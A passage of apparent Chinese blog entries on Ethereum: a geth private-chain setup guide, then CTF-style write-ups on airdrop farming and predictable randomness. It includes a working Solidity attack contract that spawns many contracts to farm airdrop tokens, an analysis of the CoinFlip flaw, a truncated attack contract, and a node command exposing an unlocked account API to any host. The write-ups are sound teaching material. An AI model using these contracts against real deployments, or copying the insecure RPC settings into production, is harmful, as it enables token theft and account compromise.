        <content type="html"><![CDATA[<h3 id="1下载客户端"><a class="markdownIt-Anchor" href="#1下载客户端"></a> 1.下载客户端</h3><p>在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。</p><p>这里是11.6版本。</p><h3 id="2准备创世块的配置文件"><a class="markdownIt-Anchor" href="#2准备创世块的配置文件"></a> 2.准备创世块的配置文件</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"chainId"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token property">"homesteadBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"byzantiumBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"constantinopleBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"eip155Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"eip158Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"eip150Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token property">"eip150Hash"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"coinbase"</span>   <span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"difficulty"</span> <span class="token operator">:</span> <span class="token string">"0x20000"</span><span class="token punctuation">,</span>  <span class="token property">"extraData"</span>  <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"gasLimit"</span>   <span class="token operator">:</span> <span class="token string">"0xffffffff"</span><span class="token punctuation">,</span>  <span class="token property">"nonce"</span>      <span class="token operator">:</span> <span class="token string">"0x0000000000000042"</span><span class="token punctuation">,</span>  <span class="token property">"mixhash"</span>    <span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"parentHash"</span> <span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"timestamp"</span>  <span class="token operator">:</span> <span class="token string">"0x00"</span><span class="token punctuation">,</span>  <span class="token property">"alloc"</span>      <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3初始化写入创世区块"><a class="markdownIt-Anchor" href="#3初始化写入创世区块"></a> 3.初始化写入创世区块</h3><pre class="line-numbers language-geth" data-language="geth"><code class="language-geth">geth init --datadir data1 genesis.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4启动geth"><a class="markdownIt-Anchor" href="#4启动geth"></a> 4.启动geth</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">geth <span class="token operator">--</span>datadir data1 <span class="token operator">--</span>networkid <span class="token number">10</span> <span class="token operator">--</span>http <span class="token operator">--</span>http<span class="token punctuation">.</span>addr <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">--</span>http<span class="token punctuation">.</span>port <span class="token number">8545</span> <span class="token operator">--</span>http<span class="token punctuation">.</span>corsdomain <span class="token string">"*"</span> <span class="token operator">--</span>http<span class="token punctuation">.</span>api <span class="token string">"db,eth,net,web3,personal,web3"</span> <span class="token operator">--</span>port <span class="token number">30305</span> <span class="token operator">-</span>allow<span class="token operator">-</span>insecure<span class="token operator">-</span>unlock console <span class="token number">2</span><span class="token operator">>></span>geth<span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>./geth</strong>：这是执行 Geth 客户端的命令。</li><li><strong>–datadir data1</strong>：这个选项指定了数据目录的路径，Geth 将在这个目录中存储区块链数据和相关文件。</li><li><strong>–networkid 10</strong>：指定私有链的网络标识符，这个值用于在不同私有链之间进行区分。</li><li><strong>–http</strong>：启用 HTTP-RPC 通信接口，允许通过 HTTP 请求与 Geth 进行交互。</li><li><strong>–http.addr 0.0.0.0</strong>：设置 HTTP-RPC 服务监听的地址，0.0.0.0 表示允许来自任何 IP 地址的连接。</li><li><strong>–http.port 8545</strong>：指定 HTTP-RPC 服务的端口号，一般是 8545。</li><li><strong>–http.corsdomain “*”</strong>：配置允许跨域请求的域名，设置为 “*” 表示允许任何域名进行跨域请求。</li><li><strong>–http.api “db,eth,net,web3,personal,web3”</strong>：指定启用的 HTTP-RPC 接口，这里列出了一些常用的接口，包括数据库、以太坊操作、网络信息、Web3 功能和个人账户操作。</li><li><strong>–port 30305</strong>：设置 Geth 节点的 P2P 网络端口，用于节点间的通信。</li><li><strong>-allow-insecure-unlock</strong>：允许以不安全的方式解锁账户。这在测试环境中使用，允许在 HTTP-RPC 上发送解锁账户的请求，但在生产环境中不建议使用</li></ol><p>web3.fromWei(eth.getBalance(eth.coinbase), “ether”);</p><h3 id="参考网站"><a class="markdownIt-Anchor" href="#参考网站"></a> 参考网站</h3><p><a href="https://www.bilibili.com/read/cv25915543/">一步步教程：使用Geth在本地搭建私有以太坊区块链 - 哔哩哔哩 (bilibili.com)</a></p><p><a href="https://www.cnblogs.com/shuhai165/p/16623128.html#autoid-0-0-0">Win10使用Geth客户端搭建以太坊私有链、连接可视化钱包 - 樹海 - 博客园 (cnblogs.com)</a></p><h3 id="web3的异常"><a class="markdownIt-Anchor" href="#web3的异常"></a> web3的异常</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>  File <span class="token string">"D:\python\Python310\lib\site-packages\web3\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_account <span class="token keyword">import</span> Account  <span class="token comment"># noqa: E402,</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_account\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_account<span class="token punctuation">.</span>account <span class="token keyword">import</span> <span class="token punctuation">(</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_account\account.py"</span><span class="token punctuation">,</span> line <span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_keyfile <span class="token keyword">import</span> <span class="token punctuation">(</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_keyfile\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">7</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_keyfile<span class="token punctuation">.</span>keyfile <span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token comment"># noqa: F401</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_keyfile\keyfile.py"</span><span class="token punctuation">,</span> line <span class="token number">11</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_keys <span class="token keyword">import</span> keys  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_keys\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">15</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> <span class="token punctuation">.</span>main <span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token comment"># noqa: F401</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_keys\main.py"</span><span class="token punctuation">,</span> line <span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> eth_utils <span class="token keyword">import</span> <span class="token punctuation">(</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_utils\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">86</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">from</span> <span class="token punctuation">.</span>network <span class="token keyword">import</span> <span class="token punctuation">(</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_utils\network.py"</span><span class="token punctuation">,</span> line <span class="token number">49</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    networks <span class="token operator">=</span> initialize_network_objects<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python\Python310\lib\site-packages\eth_utils\network.py"</span><span class="token punctuation">,</span> line <span class="token number">27</span><span class="token punctuation">,</span> <span class="token keyword">in</span> initialize_network_objects    network_data <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>open_file<span class="token punctuation">)</span>  File <span class="token string">"D:\python\Python310\lib\json\__init__.py"</span><span class="token punctuation">,</span> line <span class="token number">293</span><span class="token punctuation">,</span> <span class="token keyword">in</span> load    <span class="token keyword">return</span> loads<span class="token punctuation">(</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>UnicodeDecodeError<span class="token punctuation">:</span> <span class="token string">'gbk'</span> codec can't decode byte <span class="token number">0x88</span> <span class="token keyword">in</span> position <span class="token number">247555</span><span class="token punctuation">:</span> illegal multibyte sequence<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决方案</p><p><a href="https://blog.csdn.net/weixin_44322508/article/details/134130583">https://blog.csdn.net/weixin_44322508/article/details/134130583</a></p><h3 id="在线挖矿"><a class="markdownIt-Anchor" href="#在线挖矿"></a> 在线挖矿</h3><p><a href="http://www.snowywar.top/?golink=aHR0cHM6Ly9zZXBvbGlhLWZhdWNldC5wazkxMC5kZS8=">Sepolia PoW Faucet (pk910.de)</a></p><p><a href="http://www.snowywar.top/?golink=aHR0cHM6Ly9nb2VybGktZmF1Y2V0LnBrOTEwLmRlLw==">Goerli PoW Faucet (pk910.de)</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Airdrop Hunting</title>
      <link href="/2023/10/24/Airdrop-Hunting/"/>
      <url>/2023/10/24/Airdrop-Hunting/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>薅羊毛攻击指使用多个不同的新账户来调用空投函数获得空投币并转账至攻击者账户以达到财富累计的一种攻击方式。这类攻击方式较为普通且常见，只要是有空投函数的合约都能够进行薅羊毛。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p>数字经济大赛 2019 的 jojo</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">jojo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gift<span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">event</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span>b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">jojogame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> geteth <span class="token operator">=</span> msg<span class="token punctuation">.</span>value <span class="token operator">/</span> <span class="token number">1000000000000000000</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> geteth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span>gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">100</span><span class="token punctuation">;</span>        gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span><span class="token builtin">uint</span> value<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> value<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析如果想要出发flag函数需要余额&gt;=100000； 而单单gift()函数一次只能增加余额100，所以可以创建1000个临时合约来调用空投函数，并进行转账。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">jojo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gift<span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>            <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> instance<span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">event</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span>b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">jojogame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> geteth<span class="token operator">=</span>msg<span class="token punctuation">.</span>value<span class="token operator">/</span><span class="token number">1000000000000000000</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span>geteth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span>gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">100</span><span class="token punctuation">;</span>        gift<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span><span class="token builtin">uint</span> value<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">-=</span>value<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token operator">+=</span>value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span><span class="token punctuation">&#123;</span>   <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token builtin">uint</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>num<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Hack</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> email<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    jojo target<span class="token operator">=</span><span class="token function">jojo</span><span class="token punctuation">(</span><span class="token number">0xD15e151C53bfbDcaf21f5FC849167c526c5A4572</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    target<span class="token punctuation">.</span><span class="token function">payforflag</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    jojo tem<span class="token operator">=</span><span class="token function">jojo</span><span class="token punctuation">(</span><span class="token number">0xD15e151C53bfbDcaf21f5FC849167c526c5A4572</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    tem<span class="token punctuation">.</span><span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    tem<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Randomness</title>
      <link href="/2023/10/22/Randomness/"/>
      <url>/2023/10/22/Randomness/</url>
      
        <content type="html"><![CDATA[<h4 id="使用私有变量的伪随机数"><a class="markdownIt-Anchor" href="#使用私有变量的伪随机数"></a> 使用私有变量的伪随机数</h4><h5 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h5><p>合约使用外界未知的私有变量参与随机数生成。无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值，然后计算得到随机数。</p><h4 id="外部参与的随机数"><a class="markdownIt-Anchor" href="#外部参与的随机数"></a> 外部参与的随机数</h4><h5 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h5><p>随机数由其他服务端生成。为了确保公平，服务端会先将随机数或者其种子的哈希写入合约中，然后待用户操作之后再公布哈希对应的明文值。由于明文空间有 256 位，这样的随机数生成方法相对安全。但是在明文揭露时，我们可以在状态为 pending 的交易中找到明文数据，并以更高的 gas 抢在之前完成交易确认。</p><h4 id="使用区块变量的伪随机数"><a class="markdownIt-Anchor" href="#使用区块变量的伪随机数"></a> 使用区块变量的伪随机数</h4><h5 id="原理-3"><a class="markdownIt-Anchor" href="#原理-3"></a> 原理</h5><p>EVM 有五个字节码可以获取当前区块的变量，包括 coinbase、timestamp、number、difficulty、gaslimit。</p><p>我们也可以编写攻击合约，在攻击合约中获取到相同的区块变量值，进一步用相同的算法得到随机数值。</p><h5 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h5><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>代码处理流程为：<ul><li>获得上一块的 hash 值（    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));）</li><li>判断与之前保存的 hash 值是否相等，相等则会退（if (lastHash == blockValue) {revert();}）</li><li>根据 blockValue/FACTOR 的值判断为正或负，即通过 hash 的首位判断（bool side = coinFlip == 1 ? true : false;）</li></ul></li></ul><p>如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 Gas 上限等作为随机数的熵源，产生的随机数并不安全。</p><p>所以Attack</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token 